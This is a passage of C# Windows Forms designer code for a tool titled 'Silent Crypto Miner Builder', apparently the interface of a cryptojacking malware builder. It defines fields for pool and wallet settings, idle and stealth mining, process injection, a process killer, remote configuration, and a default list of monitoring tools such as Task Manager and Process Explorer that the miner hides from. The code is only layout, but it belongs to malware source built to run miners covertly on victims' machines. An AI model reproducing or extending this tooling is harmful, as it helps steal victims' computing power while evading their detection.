            this.txtIdleWait.TextAlignment = System.Windows.Forms.HorizontalAlignment.Right;
            this.txtIdleWait.UseSystemPasswordChar = false;
            this.txtIdleWait.WordWrap = false;
            // 
            // labelMinerETHMiningIdle
            // 
            this.labelMinerETHMiningIdle.AutoSize = true;
            this.labelMinerETHMiningIdle.Location = new System.Drawing.Point(255, 13);
            this.labelMinerETHMiningIdle.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHMiningIdle.Name = "labelMinerETHMiningIdle";
            this.labelMinerETHMiningIdle.Size = new System.Drawing.Size(76, 17);
            this.labelMinerETHMiningIdle.TabIndex = 30;
            this.labelMinerETHMiningIdle.Text = "Idle Mining:";
            // 
            // toggleIdle
            // 
            this.toggleIdle.BackColor = System.Drawing.Color.Transparent;
            this.toggleIdle.Checked = false;
            this.toggleIdle.ForeColor = System.Drawing.Color.Black;
            this.toggleIdle.Location = new System.Drawing.Point(356, 11);
            this.toggleIdle.Margin = new System.Windows.Forms.Padding(2);
            this.toggleIdle.Name = "toggleIdle";
            this.toggleIdle.Size = new System.Drawing.Size(50, 24);
            this.toggleIdle.TabIndex = 29;
            this.toggleIdle.CheckedChanged += new MephToggleSwitch.CheckedChangedEventHandler(this.toggleIdle_CheckedChanged);
            // 
            // tabAdvanced
            // 
            this.tabAdvanced.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabAdvanced.Controls.Add(this.toggleStealthFullscreen);
            this.tabAdvanced.Controls.Add(this.labelMinerXMRAdvancedStealthFullscreen);
            this.tabAdvanced.Controls.Add(this.chkAPI);
            this.tabAdvanced.Controls.Add(this.labelMinerETHAdvancedKillTargets);
            this.tabAdvanced.Controls.Add(this.labelMinerETHAdvancedStealthTargets);
            this.tabAdvanced.Controls.Add(this.chkAdvParam);
            this.tabAdvanced.Controls.Add(this.chkRemoteConfig);
            this.tabAdvanced.Controls.Add(this.txtAPI);
            this.tabAdvanced.Controls.Add(this.txtKillTargets);
            this.tabAdvanced.Controls.Add(this.txtStealthTargets);
            this.tabAdvanced.Controls.Add(this.txtAdvParam);
            this.tabAdvanced.Controls.Add(this.txtRemoteConfig);
            this.tabAdvanced.Location = new System.Drawing.Point(89, 4);
            this.tabAdvanced.Name = "tabAdvanced";
            this.tabAdvanced.Size = new System.Drawing.Size(418, 189);
            this.tabAdvanced.TabIndex = 6;
            this.tabAdvanced.Text = "Advanced";
            // 
            // toggleStealthFullscreen
            // 
            this.toggleStealthFullscreen.BackColor = System.Drawing.Color.Transparent;
            this.toggleStealthFullscreen.Checked = false;
            this.toggleStealthFullscreen.ForeColor = System.Drawing.Color.Black;
            this.toggleStealthFullscreen.Location = new System.Drawing.Point(143, 40);
            this.toggleStealthFullscreen.Margin = new System.Windows.Forms.Padding(2);
            this.toggleStealthFullscreen.Name = "toggleStealthFullscreen";
            this.toggleStealthFullscreen.Size = new System.Drawing.Size(50, 24);
            this.toggleStealthFullscreen.TabIndex = 140;
            // 
            // labelMinerXMRAdvancedStealthFullscreen
            // 
            this.labelMinerXMRAdvancedStealthFullscreen.AutoSize = true;
            this.labelMinerXMRAdvancedStealthFullscreen.BackColor = System.Drawing.Color.Transparent;
            this.labelMinerXMRAdvancedStealthFullscreen.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRAdvancedStealthFullscreen.Location = new System.Drawing.Point(14, 43);
            this.labelMinerXMRAdvancedStealthFullscreen.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRAdvancedStealthFullscreen.Name = "labelMinerXMRAdvancedStealthFullscreen";
            this.labelMinerXMRAdvancedStealthFullscreen.Size = new System.Drawing.Size(130, 17);
            this.labelMinerXMRAdvancedStealthFullscreen.TabIndex = 141;
            this.labelMinerXMRAdvancedStealthFullscreen.Text = "Stealth on Fullscreen:";
            // 
            // chkAPI
            // 
            this.chkAPI.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAPI.BackColor = System.Drawing.Color.Transparent;
            this.chkAPI.Checked = false;
            this.chkAPI.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAPI.ForeColor = System.Drawing.Color.Black;
            this.chkAPI.Location = new System.Drawing.Point(227, 68);
            this.chkAPI.Margin = new System.Windows.Forms.Padding(2);
            this.chkAPI.Name = "chkAPI";
            this.chkAPI.Size = new System.Drawing.Size(178, 24);
            this.chkAPI.TabIndex = 139;
            this.chkAPI.Text = "API Endpoint URL";
            this.chkAPI.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAPI_CheckedChanged);
            // 
            // labelMinerETHAdvancedKillTargets
            // 
            this.labelMinerETHAdvancedKillTargets.AutoSize = true;
            this.labelMinerETHAdvancedKillTargets.BackColor = System.Drawing.Color.Transparent;
            this.labelMinerETHAdvancedKillTargets.ForeColor = System.Drawing.Color.Gray;
            this.labelMinerETHAdvancedKillTargets.Location = new System.Drawing.Point(14, 133);
            this.labelMinerETHAdvancedKillTargets.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHAdvancedKillTargets.Name = "labelMinerETHAdvancedKillTargets";
            this.labelMinerETHAdvancedKillTargets.Size = new System.Drawing.Size(75, 17);
            this.labelMinerETHAdvancedKillTargets.TabIndex = 137;
            this.labelMinerETHAdvancedKillTargets.Text = "Kill Targets:";
            // 
            // labelMinerETHAdvancedStealthTargets
            // 
            this.labelMinerETHAdvancedStealthTargets.AutoSize = true;
            this.labelMinerETHAdvancedStealthTargets.BackColor = System.Drawing.Color.Transparent;
            this.labelMinerETHAdvancedStealthTargets.ForeColor = System.Drawing.Color.Gray;
            this.labelMinerETHAdvancedStealthTargets.Location = new System.Drawing.Point(14, 77);
            this.labelMinerETHAdvancedStealthTargets.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerETHAdvancedStealthTargets.Name = "labelMinerETHAdvancedStealthTargets";
            this.labelMinerETHAdvancedStealthTargets.Size = new System.Drawing.Size(97, 17);
            this.labelMinerETHAdvancedStealthTargets.TabIndex = 135;
            this.labelMinerETHAdvancedStealthTargets.Text = "Stealth Targets:";
            // 
            // chkAdvParam
            // 
            this.chkAdvParam.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAdvParam.BackColor = System.Drawing.Color.Transparent;
            this.chkAdvParam.Checked = false;
            this.chkAdvParam.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAdvParam.ForeColor = System.Drawing.Color.Black;
            this.chkAdvParam.Location = new System.Drawing.Point(227, 124);
            this.chkAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.chkAdvParam.Name = "chkAdvParam";
            this.chkAdvParam.Size = new System.Drawing.Size(178, 24);
            this.chkAdvParam.TabIndex = 131;
            this.chkAdvParam.Text = "Advanced Parameters";
            this.chkAdvParam.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAdvParam_CheckedChanged);
            // 
            // chkRemoteConfig
            // 
            this.chkRemoteConfig.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkRemoteConfig.BackColor = System.Drawing.Color.Transparent;
            this.chkRemoteConfig.Checked = false;
            this.chkRemoteConfig.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkRemoteConfig.ForeColor = System.Drawing.Color.Black;
            this.chkRemoteConfig.Location = new System.Drawing.Point(227, 12);
            this.chkRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.chkRemoteConfig.Name = "chkRemoteConfig";
            this.chkRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.chkRemoteConfig.TabIndex = 133;
            this.chkRemoteConfig.Text = "Remote Configuration";
            this.chkRemoteConfig.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkRemoteConfig_CheckedChanged);
            // 
            // txtAPI
            // 
            this.txtAPI.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAPI.Enabled = false;
            this.txtAPI.ForeColor = System.Drawing.Color.Silver;
            this.txtAPI.Location = new System.Drawing.Point(227, 96);
            this.txtAPI.Margin = new System.Windows.Forms.Padding(2);
            this.txtAPI.MaxLength = 32767;
            this.txtAPI.MultiLine = false;
            this.txtAPI.Name = "txtAPI";
            this.txtAPI.Size = new System.Drawing.Size(178, 24);
            this.txtAPI.TabIndex = 138;
            this.txtAPI.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAPI.UseSystemPasswordChar = false;
            this.txtAPI.WordWrap = false;
            // 
            // txtKillTargets
            // 
            this.txtKillTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtKillTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtKillTargets.Location = new System.Drawing.Point(15, 152);
            this.txtKillTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtKillTargets.MaxLength = 32767;
            this.txtKillTargets.MultiLine = false;
            this.txtKillTargets.Name = "txtKillTargets";
            this.txtKillTargets.Size = new System.Drawing.Size(178, 24);
            this.txtKillTargets.TabIndex = 136;
            this.txtKillTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtKillTargets.UseSystemPasswordChar = false;
            this.txtKillTargets.WordWrap = false;
            // 
            // txtStealthTargets
            // 
            this.txtStealthTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStealthTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtStealthTargets.Location = new System.Drawing.Point(15, 96);
            this.txtStealthTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtStealthTargets.MaxLength = 32767;
            this.txtStealthTargets.MultiLine = false;
            this.txtStealthTargets.Name = "txtStealthTargets";
            this.txtStealthTargets.Size = new System.Drawing.Size(178, 24);
            this.txtStealthTargets.TabIndex = 134;
            this.txtStealthTargets.Text = "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe";
            this.txtStealthTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStealthTargets.UseSystemPasswordChar = false;
            this.txtStealthTargets.WordWrap = false;
            // 
            // txtAdvParam
            // 
            this.txtAdvParam.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAdvParam.Enabled = false;
            this.txtAdvParam.ForeColor = System.Drawing.Color.Silver;
            this.txtAdvParam.Location = new System.Drawing.Point(227, 152);
            this.txtAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.txtAdvParam.MaxLength = 32767;
            this.txtAdvParam.MultiLine = false;
            this.txtAdvParam.Name = "txtAdvParam";
            this.txtAdvParam.Size = new System.Drawing.Size(178, 24);
            this.txtAdvParam.TabIndex = 130;
            this.txtAdvParam.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAdvParam.UseSystemPasswordChar = false;
            this.txtAdvParam.WordWrap = false;
            // 
            // txtRemoteConfig
            // 
            this.txtRemoteConfig.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtRemoteConfig.Enabled = false;
            this.txtRemoteConfig.ForeColor = System.Drawing.Color.Silver;
            this.txtRemoteConfig.Location = new System.Drawing.Point(227, 40);
            this.txtRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.txtRemoteConfig.MaxLength = 32767;
            this.txtRemoteConfig.MultiLine = false;
            this.txtRemoteConfig.Name = "txtRemoteConfig";
            this.txtRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.txtRemoteConfig.TabIndex = 132;
            this.txtRemoteConfig.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtRemoteConfig.UseSystemPasswordChar = false;
            this.txtRemoteConfig.WordWrap = false;
            // 
            // tabJSON
            // 
            this.tabJSON.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabJSON.Controls.Add(this.txtJSON);
            this.tabJSON.Location = new System.Drawing.Point(89, 4);
            this.tabJSON.Name = "tabJSON";
            this.tabJSON.Size = new System.Drawing.Size(418, 189);
            this.tabJSON.TabIndex = 7;
            this.tabJSON.Text = "JSON";
            // 
            // txtJSON
            // 
            this.txtJSON.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtJSON.ForeColor = System.Drawing.Color.Silver;
            this.txtJSON.Location = new System.Drawing.Point(3, 3);
            this.txtJSON.MaxLength = 32767;
            this.txtJSON.MultiLine = true;
            this.txtJSON.Name = "txtJSON";
            this.txtJSON.Size = new System.Drawing.Size(412, 183);
            this.txtJSON.TabIndex = 0;
            this.txtJSON.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtJSON.UseSystemPasswordChar = false;
            this.txtJSON.WordWrap = false;
            // 
            // MinerETH
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(535, 272);
            this.Controls.Add(this.formMinerETH);
            this.Font = new System.Drawing.Font("Segoe UI", 8.59375F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(535, 272);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(535, 272);
            this.Name = "MinerETH";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Silent Crypto Miner Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MinerETH_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.formMinerETH.ResumeLayout(false);
            this.tabcontrolMinerETH.ResumeLayout(false);
            this.tabConnection.ResumeLayout(false);
            this.groupOptional.ResumeLayout(false);
            this.groupOptional.PerformLayout();
            this.groupRequired.ResumeLayout(false);
            this.groupRequired.PerformLayout();
            this.tabMining.ResumeLayout(false);
            this.tabMining.PerformLayout();
            this.tabAdvanced.ResumeLayout(false);
            this.tabAdvanced.PerformLayout();
            this.tabJSON.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        internal MephTheme formMinerETH;
        internal Label labelMinerETHConnectionPool;
        internal MephTextBox txtPoolURL;
        internal Label labelMinerETHConnectionPassword;
        internal MephTextBox txtPoolPassowrd;
        internal Label labelMinerETHConnectionWallet;
        internal MephTextBox txtPoolUsername;
        internal MephTabcontrol tabcontrolMinerETH;
        internal TabPage tabConnection;
        internal TabPage tabMining;
        internal Label labelMinerETHMiningIdle;
        internal Label labelMinerETHMiningIdleMinutes;
        internal Label labelMinerETHMiningIdleWait;
        internal MephTextBox txtIdleWait;
        internal Label labelMinerETHMiningStealth;
        internal MephToggleSwitch toggleStealth;
        internal Label labelMinerETHConnectionScheme;
        internal MephComboBox comboPoolScheme;
        internal Label labelMinerETHConnectionExtra;
        internal MephTextBox txtPoolData;
        internal Label labelMinerETHMiningInject;
        internal MephComboBox comboInjection;
        internal MephGroupBox groupOptional;
        internal Label labelMinerETHConnectionWorker;
        internal MephTextBox txtPoolWorker;
        internal MephGroupBox groupRequired;
        internal MephComboBox comboIdleGPU;
        internal MephComboBox comboMaxGPU;
        internal Label labelMinerETHMiningIdleGPU;
        internal Label labelMinerETHMiningMaxGPU;
        internal TabPage tabAdvanced;
        internal MephToggleSwitch toggleIdle;
        internal Label labelMinerETHMiningAlgorithm;
        internal MephComboBox comboAlgorithm;
        private TabPage tabJSON;
        private MephTextBox txtJSON;
        internal Label labelMinerETHMiningProcessKiller;
        internal MephToggleSwitch toggleProcessKiller;
        internal MephCheckBox chkAPI;
        internal Label labelMinerETHAdvancedKillTargets;
        internal Label labelMinerETHAdvancedStealthTargets;
        internal MephCheckBox chkAdvParam;
        internal MephCheckBox chkRemoteConfig;
        internal MephTextBox txtAPI;
        internal MephTextBox txtKillTargets;
        internal MephTextBox txtStealthTargets;
        internal MephTextBox txtAdvParam;
        internal MephTextBox txtRemoteConfig;
        internal MephToggleSwitch toggleStealthFullscreen;
        internal Label labelMinerXMRAdvancedStealthFullscreen;
    }
}